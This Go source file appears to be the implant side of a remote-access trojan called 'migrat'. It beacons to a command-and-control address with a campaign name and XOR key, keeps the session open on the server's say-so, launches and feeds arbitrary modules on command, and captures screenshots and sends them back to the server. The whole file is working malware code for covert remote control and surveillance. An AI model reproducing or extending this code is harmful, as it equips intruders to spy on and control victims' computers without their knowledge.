package main

import (
	"log"
	"migrat/contact"
	"migrat/module"
	"migrat/state"
	"net"
	"strconv"
	"time"

	"google.golang.org/protobuf/proto"
)

func main() {

	state := state.Init_state("campain", "127.0.0.1:4040", "key")

	for {
		log.Println("sleeping 10 seconds")
		time.Sleep(2 * time.Second)
		log.Println("Connecting...")
		conn, err := net.Dial("tcp", state.C2address)
		if err != nil {
			log.Println(err.Error())
			continue
		}

		if heartbeat(conn, &state) {
			persist(conn, &state)
		}
		conn.Close()
	}

}

func heartbeat(conn net.Conn, state *state.State) bool {

	ident := state.Info.To_ident()

	err := contact.SendMessage(conn, ident, state.Info.Xorkey)
	if err != nil {
		log.Println("ERROR sending message: ", err.Error())
		return false
	}
	log.Println("now Reading message")
	message, err := contact.ReadMessage(conn, state.Info.Xorkey)
	if err != nil {
		log.Println("READER ERROR: reading message: ", err.Error())
		return false
	}

	switch m := message.(type) {
	case *contact.HeartbeatResponse:
		log.Println("Got Heartbeat Response")
		log.Println(m.KeepOpen)
		if m.KeepOpen {
			log.Println("Got keepalive")
			return true
		}
	default:
		log.Println("unknown message", m)
		return false
	}
	return false

}

func persist(conn net.Conn, state *state.State) {
	abort := make(chan bool)
	go module.Loop_modules(state.RunningModules, &state.ModulesLock, conn, state.Info.Xorkey, abort)

	for {

		// read messages
		message, err := contact.ReadMessage(conn, state.Info.Xorkey)
		if err != nil {
			log.Println("READER ERROR: reading message: ", err.Error())
			abort <- true
			break
		}

		message_name := message.ProtoReflect().Descriptor().FullName()
		log.Println("Got Message: ", message_name)

		handleMessage(conn, message, state)

	}

}

// Reads a message from the connection and acts on it
func handleMessage(conn net.Conn, message proto.Message, state *state.State) {
	switch m := message.(type) {

	case *contact.ModuleStart:
		log.Println("handleMessage --> ModuleStart")
		state.ModulesLock.Lock()
		defer state.ModulesLock.Unlock()
		if _, ok := state.RunningModules[m.Name]; ok {
			log.Println("handleMessage --> Module already running")
			contact.SendMessage(conn, &contact.Error{Message: "Module already running"}, state.Info.Xorkey)
			return
		}
		log.Println("handleMessage --> Starting Module")
		module, err := module.Module_start(m)
		if err != nil {
			log.Println("handleMessage --> ERROR starting module: ", err.Error())
			contact.SendMessage(conn, &contact.Error{Message: "ERROR starting module"}, state.Info.Xorkey)
			return
		}
		state.RunningModules[m.Name] = module

		// get all module names
		var module_names []string
		for name := range state.RunningModules {
			module_names = append(module_names, name)
		}
		contact.SendMessage(conn, &contact.ModuleList{Modules: module_names}, state.Info.Xorkey)

	case *contact.ModuleInput:
		log.Println("handleMessage --> ModuleInput for : ", m.Name)
		// get the module and send the command
		state.ModulesLock.Lock()
		mod, ok := state.RunningModules[m.Name]
		if !ok {
			log.Println("handleMessage --> Module not found: ", m.Name)
			contact.SendMessage(conn, &contact.Error{Message: "Module not found"}, state.Info.Xorkey)
			return
		}
		state.ModulesLock.Unlock()

		log.Println("handleMessage --> Sending command to module: ", m.Name)
		mod.In(m.Input)

	case *contact.TakeScreenshot:
		screenshot, err := take_screenshot()
		if err != nil {
			log.Println("ERROR: ", err.Error())
			return
		}
		if err := contact.SendMessage(conn, &contact.Screenshot{
			Data: screenshot,
			Time: strconv.FormatInt(time.Now().Unix(), 10),
		}, state.Info.Xorkey); err != nil {
			log.Println("error sending image: ", err.Error())
		}
	}
}
